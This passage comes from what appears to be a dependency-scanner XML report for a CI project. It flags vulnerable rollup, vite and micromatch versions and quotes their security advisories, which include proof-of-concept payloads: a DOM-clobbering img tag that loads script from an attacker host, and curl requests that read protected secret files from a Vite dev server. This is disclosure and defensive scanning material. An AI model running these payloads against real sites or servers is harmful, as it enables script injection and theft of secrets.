</source><url>https://github.com/micromatch/micromatch/issues/243</url><name>https://github.com/micromatch/micromatch/issues/243</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade</url><name>https://github.com/micromatch/micromatch/commit/03aa8052171e878897eee5d7bb2ae0ae83ec2ade</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-4067</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-4067</name></reference><reference><source>NPM Advisory reference: </source><url>https://advisory.checkmarx.net/advisory/CVE-2024-4067</url><name>https://advisory.checkmarx.net/advisory/CVE-2024-4067</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-952p-6rrq-rcjv</url><name>https://github.com/advisories/GHSA-952p-6rrq-rcjv</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:micromatch:\&lt;4.0.8:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>middleware.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/utils/middleware.js</filePath><md5>d5e7467fa759d5e61dd19e337aec4379</md5><sha1>7e4315d2de37b251c6f4553fd34b5d4957651a06</sha1><sha256>24e81223b6a963ccb3c23f25b91a452763a3a27b23c61e8b596048894e2a0ae3</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>post.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/models/post.js</filePath><md5>0983f82db614dee5be6f0f4615be75e6</md5><sha1>5ee6abf90d518b2619e5d7c65c9c4e74dc54a2d6</sha1><sha256>2612ad175440f1c2e671bc24f4520885ddb679cf8a7695e5321f4936a0d7c3e6</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>postcss.config.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/postcss.config.js</filePath><md5>c735540bb63936a123bc867d950c9f69</md5><sha1>50423d11f317aef9d5fcfb2563b2a501b344dcd5</sha1><sha256>e32657baf631d7c5f4dc67b4b2ee0ec8e7d5b3c41860e09cddce7c0377cd80bc</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts-controller.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/controllers/posts-controller.js</filePath><md5>0b4d5a7a81d2e71ff1fed54f0813943d</md5><sha1>f847cc158edbedd1c9fb64a992e8de959f9ed893</sha1><sha256>b9e94c735420c4e51865abba14fc6e97fc84ba44804af3e1f3b47556c97b3c58</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts-controller.test.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/tests/integration/controllers/posts-controller.test.js</filePath><md5>c599740ffee841e7a52538b708f3fb93</md5><sha1>10e4c19e24f6cfac136a80eea9284cc1ce7ee89a</sha1><sha256>9de533114d00385a4a1752d35052fcf29090f933f08cc440aca97f691158becd</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts-controller.test.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/tests/unit/controllers/posts-controller.test.js</filePath><md5>9aa04a3348b275e652c4f5ba093f3269</md5><sha1>f76d617f4e8577d0671046ea8eb4ce5666cc71af</sha1><sha256>17757676a2cd0042a3f70634b9eb1a1f14a00d509351a3ea349568c0316f5a8d</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>posts.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/routes/posts.js</filePath><md5>07fd53647861cbbd9a0a25268b4e722b</md5><sha1>a6f479132f90552e105e4803677f7b36e7f4bd95</sha1><sha256>b03708cbd4cad1ba17728c944fa68edb1971ccb1a5451b931405c1adbf1e8eb3</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>redis.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/services/redis.js</filePath><md5>dfe9ef539e9eda73ef5abc1378f9ca19</md5><sha1>bda7b3df4dbc7f9665b2fd85088e01648505d38b</sha1><sha256>e5b503051d566d753d85c459f5a0331a5710abcb80d2c7e06b84de4f50f0299b</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>rollup:3.29.4</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/package-lock.json?rollup</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>rollup</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>rollup</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>3.29.4</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/rollup@3.29.4</id><url>https://ossindex.sonatype.org/component/pkg:npm/rollup@3.29.4?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url></package></identifiers><vulnerabilities><vulnerability source="NPM"><name>GHSA-gcx4-mw62-g8wm</name><severity unscored="true">high</severity><cvssV3><baseScore>6.400000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>### Summary
+
+We discovered a DOM Clobbering vulnerability in rollup when bundling scripts that use `import.meta.url` or with plugins that emit and reference asset files from code  in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.
+
+It&apos;s worth noting that we’ve identifed similar issues in other popular bundlers like Webpack ([CVE-2024-43788](https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986)), which might serve as a good reference.
+
+### Details
+
+#### Backgrounds
+
+DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:
+
+[1] https://scnps.co/papers/sp23_domclob.pdf
+[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/
+
+#### Gadget found in `rollup`
+
+We have identified a DOM Clobbering vulnerability in `rollup` bundled scripts, particularly when the scripts uses `import.meta` and set output in format of  `cjs`/`umd`/`iife`. In such cases, `rollup` replaces meta property with the URL retrieved from `document.currentScript`.
+
+https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162
+
+https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185
+
+However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&apos;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the `src` attribute of the attacker-controlled element (e.g., an `img` tag ) is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.
+
+### PoC
+
+Considering a website that contains the following `main.js` script, the devloper decides to use the `rollup` to bundle up the program: `rollup main.js --format cjs --file bundle.js`.
+
+```
+var s = document.createElement(&apos;script&apos;)
+s.src = import.meta.url + &apos;extra.js&apos;
+document.head.append(s)
+```
+
+The output `bundle.js` is shown in the following code snippet.
+
+```
+&apos;use strict&apos;;
+
+var _documentCurrentScript = typeof document !== &apos;undefined&apos; ? document.currentScript : null;
+var s = document.createElement(&apos;script&apos;);
+s.src = (typeof document === &apos;undefined&apos; ? require(&apos;u&apos; + &apos;rl&apos;).pathToFileURL(__filename).href : (_documentCurrentScript &amp;&amp; False &amp;&amp; _documentCurrentScript.src || new URL(&apos;bundle.js&apos;, document.baseURI).href)) + &apos;extra.js&apos;;
+document.head.append(s);
+```
+
+Adding the `rollup` bundled script, `bundle.js`, as part of the web page source code, the page could load the `extra.js` file from the attacker&apos;s domain, `attacker.controlled.server` due to the introduced gadget during bundling. The attacker only needs to insert an `img` tag with the name attribute set to `currentScript`. This can be done through a website&apos;s feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.
+
+```
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+  &lt;title&gt;rollup Example&lt;/title&gt;
+  &lt;!-- Attacker-controlled Script-less HTML Element starts--!&gt;
+  &lt;img name=&quot;currentScript&quot; src=&quot;https://attacker.controlled.server/&quot;&gt;&lt;/img&gt;
+  &lt;!-- Attacker-controlled Script-less HTML Element ends--!&gt;
+&lt;/head&gt;
+&lt;script type=&quot;module&quot; crossorigin src=&quot;bundle.js&quot;&gt;&lt;/script&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+```
+
+### Impact
+
+This vulnerability can result in cross-site scripting (XSS) attacks on websites that include rollup-bundled files (configured with an output format of `cjs`, `iife`, or `umd` and use `import.meta`) and allow users to inject certain scriptless HTML tags without properly sanitizing the `name` or `id` attributes.
+
+### Patch
+
+Patching the following two functions with type checking would be effective mitigations against DOM Clobbering attack.
+
+```
+const getRelativeUrlFromDocument = (relativePath: string, umd = false) =&gt;
+	getResolveUrl(
+		`&apos;${escapeId(relativePath)}&apos;, ${
+			umd ? `typeof document === &apos;undefined&apos; ? location.href : ` : &apos;&apos;
+		}document.currentScript &amp;&amp; document.currentScript.tagName.toUpperCase() === &apos;SCRIPT&apos; &amp;&amp; document.currentScript.src || document.baseURI`
+	);
+```
+
+```
+const getUrlFromDocument = (chunkId: string, umd = false) =&gt;
+	`${
+		umd ? `typeof document === &apos;undefined&apos; ? location.href : ` : &apos;&apos;
+	}(${DOCUMENT_CURRENT_SCRIPT} &amp;&amp; ${DOCUMENT_CURRENT_SCRIPT}.tagName.toUpperCase() === &apos;SCRIPT&apos; &amp;&amp;${DOCUMENT_CURRENT_SCRIPT}.src || new URL(&apos;${escapeId(
+		chunkId
+	)}&apos;, document.baseURI).href)`;
+```
+</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</url><name>https://github.com/rollup/rollup/commit/2ef77c00ec2635d42697cff2c0567ccc8db34fb4</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</url><name>https://github.com/advisories/GHSA-gcx4-mw62-g8wm</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</url><name>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L157-L162</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</url><name>https://github.com/rollup/rollup/blob/b86ffd776cfa906573d36c3f019316d02445d9ef/src/ast/nodes/MetaProperty.ts#L180-L185</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-47068</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-47068</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</url><name>https://github.com/rollup/rollup/commit/e2552c9e955e0a61f70f508200ee9f752f85a541</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</url><name>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:rollup:\&gt;\=3.0.0\&lt;3.29.5:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-47068</name><severity>MEDIUM</severity><cvssV3><baseScore>6.099999904632568</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>REQUIRED</userInteraction><scope>CHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>Rollup is a module bundler for JavaScript. Versions prior to 3.29.5 and 4.22.4 are susceptible to a DOM Clobbering vulnerability when bundling scripts with properties from `import.meta` (e.g., `import.meta.url`) in `cjs`/`umd`/`iife` format. The DOM Clobbering gadget can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present. Versions 3.29.5 and 4.22.4  contain a patch for the vulnerability.</description><references><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-47068</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-47068</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-47068?component-type=npm&amp;component-name=rollup&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-47068] CWE-79: Improper Neutralization of Input During Web Page Generation (&apos;Cross-site Scripting&apos;)</name></reference><reference><source>OSSIndex</source><url>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</url><name>https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:rollup:3.29.4:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability></vulnerabilities></dependency><dependency isVirtual="false"><fileName>server.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/server.js</filePath><md5>b90c3e813ce5225a4e9e76f6a4ad4e57</md5><sha1>2e9a462595cc1608ef62b4b2a1c3522d0d1e1123</sha1><sha256>3dce79136a00baca936e250add6491ac12444ea86a9b85e1c3cb4f0adfcc17e0</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>tailwind.config.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/tailwind.config.js</filePath><md5>d625ed753d8778a5d00bdc6a6f94c02e</md5><sha1>d27755ec854333afd04c48cb6c06900e1e91a2ef</sha1><sha256>7863dcd0edfdb2f63e3240e62e30ffa19156e83e91e315f5d00114ee44eda83d</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>teardown.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/tests/teardown.js</filePath><md5>35629cb4dcf8de2438e06e5618250a92</md5><sha1>1826931eb31129dfd87b0cce23944f89786583ed</sha1><sha256>a8b95ef9b30baecb0660b02c18e36e43ed8204682bb7b70ad8d764f767e493ac</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>user.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/models/user.js</filePath><md5>5b21414afe2b1474f63042c8b312a019</md5><sha1>bc8f1e1324bb8ae00d698492de8b28398eba73d5</sha1><sha256>b800ba49fdb2eceeb0bb6db707fc9deae18e0a08350c95ded5a9758af375dad0</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="false"><fileName>utils.js</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/backend/config/utils.js</filePath><md5>29a2a6fc82c1a40657b04ad2876ee76b</md5><sha1>45b30bda65af9823379bfb3e42ca903f29a984fc</sha1><sha256>581f5ee117d2e29d95094de54a6bfe98cb230d22cb111f2f0afc6dcba61cab92</sha256><evidenceCollected></evidenceCollected></dependency><dependency isVirtual="true"><fileName>vite:4.5.0</fileName><filePath>/var/lib/jenkins/workspace/Wanderlust-CI/frontend/package-lock.json?vite</filePath><md5></md5><sha1></sha1><sha256></sha256><projectReferences><projectReference>package-lock.json: transitive</projectReference></projectReferences><evidenceCollected><evidence type="vendor" confidence="HIGH"><source>package.json</source><name>name</name><value>vite</value></evidence><evidence type="product" confidence="HIGHEST"><source>package.json</source><name>name</name><value>vite</value></evidence><evidence type="version" confidence="HIGHEST"><source>package.json</source><name>version</name><value>4.5.0</value></evidence></evidenceCollected><identifiers><package confidence="HIGHEST"><id>pkg:npm/vite@4.5.0</id><url>https://ossindex.sonatype.org/component/pkg:npm/vite@4.5.0?utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url></package></identifiers><vulnerabilities><vulnerability source="OSSINDEX"><name>CVE-2024-23331</name><severity>HIGH</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-178</cwe></cwes><description>Vite is a frontend tooling framework for javascript. The Vite dev server option `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows. This bypass is similar to CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems. Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn&apos;t discriminate; a blacklist bypass is possible. By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. This issue has been addressed in vite@5.0.12, vite@4.5.2, vite@3.2.8, and vite@2.9.17. Users are advised to upgrade. Users unable to upgrade should restrict access to dev servers.</description><references><reference><source>OSSIndex</source><url>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</name></reference><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-23331?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-23331] CWE-178: Improper Handling of Case Sensitivity</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-23331</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-23331</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-c24v-8rfc-w8vw</name><severity unscored="true">high</severity><cvssV3><baseScore>7.5</baseScore><attackVector>NETWORK</attackVector><attackComplexity>LOW</attackComplexity><privilegesRequired>NONE</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>HIGH</confidentialityImpact><integrityImpact>NONE</integrityImpact><availabilityImpact>NONE</availabilityImpact><baseSeverity>HIGH</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-284</cwe><cwe>CWE-178</cwe><cwe>CWE-200</cwe></cwes><description>### Summary
+[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` can be bypassed on case-insensitive file systems using case-augmented versions of filenames. Notably this affects servers hosted on Windows.
+
+This bypass is similar to https://nvd.nist.gov/vuln/detail/CVE-2023-34092 -- with surface area reduced to hosts having case-insensitive filesystems.
+
+### Patches
+Fixed in vite@5.0.12, vite@4.5.2, vite@3.2.8, vite@2.9.17
+
+### Details
+Since `picomatch` defaults to case-sensitive glob matching, but the file server doesn&apos;t discriminate; a blacklist bypass is possible. 
+
+See `picomatch`  usage, where `nocase` is defaulted to `false`: https://github.com/vitejs/vite/blob/v5.1.0-beta.1/packages/vite/src/node/server/index.ts#L632
+
+By requesting raw filesystem paths using augmented casing, the matcher derived from `config.server.fs.deny` fails to block access to sensitive files. 
+
+### PoC
+**Setup**
+1. Created vanilla Vite project using `npm create vite@latest` on a Standard Azure hosted Windows 10 instance. 
+    - `npm run dev -- --host 0.0.0.0`
+    - Publicly accessible for the time being here: http://20.12.242.81:5173/ 
+2. Created dummy secret files, e.g. `custom.secret` and `production.pem`
+3. Populated `vite.config.js` with
+```javascript
+export default { server: { fs: { deny: [&apos;.env&apos;, &apos;.env.*&apos;, &apos;*.{crt,pem}&apos;, &apos;custom.secret&apos;] } } }
+```
+
+**Reproduction**
+1. `curl -s http://20.12.242.81:5173/@fs//`
+    - Descriptive error page reveals absolute filesystem path to project root
+2. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/vite.config.js`
+    - Discoverable configuration file reveals locations of secrets
+3. `curl -s http://20.12.242.81:5173/@fs/C:/Users/darbonzo/Desktop/vite-project/custom.sEcReT`
+    - Secrets are directly accessible using case-augmented version of filename
+
+**Proof**
+![Screenshot 2024-01-19 022736](https://user-images.githubusercontent.com/907968/298020728-3a8d3c06-fcfd-4009-9182-e842f66a6ea5.png)
+
+### Impact
+**Who**
+- Users with exposed dev servers on environments with case-insensitive filesystems
+
+**What**
+- Files protected by `server.fs.deny` are both discoverable, and accessible</description><references><reference><source>NPM Advisory reference: </source><url>https://github.com/advisories/GHSA-c24v-8rfc-w8vw</url><name>https://github.com/advisories/GHSA-c24v-8rfc-w8vw</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2024-23331</url><name>https://nvd.nist.gov/vuln/detail/CVE-2024-23331</name></reference><reference><source>NPM Advisory reference: </source><url>https://vitejs.dev/config/server-options.html#server-fs-deny</url><name>https://vitejs.dev/config/server-options.html#server-fs-deny</name></reference><reference><source>NPM Advisory reference: </source><url>https://nvd.nist.gov/vuln/detail/CVE-2023-34092</url><name>https://nvd.nist.gov/vuln/detail/CVE-2023-34092</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/0cd769c279724cf27934b1270fbdd45d68217691</url><name>https://github.com/vitejs/vite/commit/0cd769c279724cf27934b1270fbdd45d68217691</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/91641c4da0a011d4c5352e88fc68389d4e1289a5</url><name>https://github.com/vitejs/vite/commit/91641c4da0a011d4c5352e88fc68389d4e1289a5</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/eeec23bbc9d476c54a3a6d36e78455867185a7cb</url><name>https://github.com/vitejs/vite/commit/eeec23bbc9d476c54a3a6d36e78455867185a7cb</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</url><name>https://github.com/vitejs/vite/security/advisories/GHSA-c24v-8rfc-w8vw</name></reference><reference><source>NPM Advisory reference: </source><url>https://github.com/vitejs/vite/commit/a26c87d20f9af306b5ce3ff1648be7fa5146c278</url><name>https://github.com/vitejs/vite/commit/a26c87d20f9af306b5ce3ff1648be7fa5146c278</name></reference></references><vulnerableSoftware><software>cpe:2.3:a:*:vite:\&gt;\=4.0.0\&lt;\=4.5.1:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="OSSINDEX"><name>CVE-2024-45812</name><severity>MEDIUM</severity><cvssV3><baseScore>6.400000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>Vite a frontend build tooling framework for javascript. Affected versions of vite were discovered to contain a DOM Clobbering vulnerability when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present. DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`. However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&apos;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server. This vulnerability can result in cross-site scripting (XSS) attacks on websites that include Vite-bundled files (configured with an output format of `cjs`, `iife`, or `umd`) and allow users to inject certain scriptless HTML tags without properly sanitizing the name or id attributes. This issue has been patched in versions 5.4.6, 5.3.6, 5.2.14, 4.5.5, and 3.2.11. Users are advised to upgrade. There are no known workarounds for this vulnerability.</description><references><reference><source>OSSINDEX</source><url>https://ossindex.sonatype.org/vulnerability/CVE-2024-45812?component-type=npm&amp;component-name=vite&amp;utm_source=dependency-check&amp;utm_medium=integration&amp;utm_content=10.0.4</url><name>[CVE-2024-45812] CWE-79: Improper Neutralization of Input During Web Page Generation (&apos;Cross-site Scripting&apos;)</name></reference><reference><source>OSSIndex</source><url>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45812</url><name>http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-45812</name></reference><reference><source>OSSIndex</source><url>https://github.com/advisories/GHSA-64vr-g452-qvp3</url><name>https://github.com/advisories/GHSA-64vr-g452-qvp3</name></reference></references><vulnerableSoftware><software vulnerabilityIdMatched="true">cpe:2.3:a:*:vite:4.5.0:*:*:*:*:*:*:*</software></vulnerableSoftware></vulnerability><vulnerability source="NPM"><name>GHSA-64vr-g452-qvp3</name><severity unscored="true">moderate</severity><cvssV3><baseScore>6.400000095367432</baseScore><attackVector>NETWORK</attackVector><attackComplexity>HIGH</attackComplexity><privilegesRequired>LOW</privilegesRequired><userInteraction>NONE</userInteraction><scope>UNCHANGED</scope><confidentialityImpact>LOW</confidentialityImpact><integrityImpact>LOW</integrityImpact><availabilityImpact>HIGH</availabilityImpact><baseSeverity>MEDIUM</baseSeverity><version>3.1</version></cvssV3><cwes><cwe>CWE-79</cwe></cwes><description>### Summary
+
+We discovered a DOM Clobbering vulnerability in Vite when building scripts to `cjs`/`iife`/`umd` output format. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an img tag with an unsanitized name attribute) are present.
+
+Note that, we have identified similar security issues in Webpack: https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
+
+### Details
+
+**Backgrounds**
+
+DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:
+
+[1] https://scnps.co/papers/sp23_domclob.pdf
+[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/
+
+**Gadgets found in Vite**
+
+We have identified a DOM Clobbering vulnerability in Vite bundled scripts, particularly when the scripts dynamically import other scripts from the assets folder and the developer sets the build output format to `cjs`, `iife`, or `umd`. In such cases, Vite replaces relative paths starting with `__VITE_ASSET__` using the URL retrieved from `document.currentScript`.
+
+However, this implementation is vulnerable to a DOM Clobbering attack. The `document.currentScript` lookup can be shadowed by an attacker via the browser&apos;s named DOM tree element access mechanism. This manipulation allows an attacker to replace the intended script element with a malicious HTML element. When this happens, the src attribute of the attacker-controlled element is used as the URL for importing scripts, potentially leading to the dynamic loading of scripts from an attacker-controlled server.
+
+```
+const relativeUrlMechanisms = {
+  amd: (relativePath) =&gt; {
+    if (relativePath[0] !== &quot;.&quot;) relativePath = &quot;./&quot; + relativePath;
+    return getResolveUrl(
+      `require.toUrl(&apos;${escapeId(relativePath)}&apos;), document.baseURI`
+    );
+  },
+  cjs: (relativePath) =&gt; `(typeof document === &apos;undefined&apos; ? ${getFileUrlFromRelativePath(
+    relativePath
+  )} : ${getRelativeUrlFromDocument(relativePath)})`,
+  es: (relativePath) =&gt; getResolveUrl(
+    `&apos;${escapeId(partialEncodeURIPath(relativePath))}&apos;, import.meta.url`
+  ),
+  iife: (relativePath) =&gt; getRelativeUrlFromDocument(relativePath),
+  // NOTE: make sure rollup generate `module` params
+  system: (relativePath) =&gt; getResolveUrl(
+    `&apos;${escapeId(partialEncodeURIPath(relativePath))}&apos;, module.meta.url`
+  ),
+  umd: (relativePath) =&gt; `(typeof document === &apos;undefined&apos; &amp;&amp; typeof location === &apos;undefined&apos; ? ${getFileUrlFromRelativePath(
+    relativePath
+  )} : ${getRelativeUrlFromDocument(relativePath, true)})`
+};
+```
+
+### PoC
+
+Considering a website that contains the following `main.js` script, the devloper decides to use the Vite to bundle up the program with the following configuration. 
+
+```
+// main.js
